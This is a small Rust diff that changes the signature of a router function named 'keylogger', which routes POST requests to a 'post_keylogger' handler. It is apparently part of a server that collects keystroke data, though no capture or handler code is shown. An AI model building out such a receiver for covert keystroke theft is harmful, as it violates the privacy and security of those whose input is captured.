@@ -6,6 +6,6 @@ pub use post_keylogger::post_keylogger;
 
 use crate::AppState;
 
-pub fn keylogger() -> Router<AppState> {
+pub fn keylogger(_state: &AppState) -> Router<AppState> {
     Router::new().route("/", post(post_keylogger))
 }
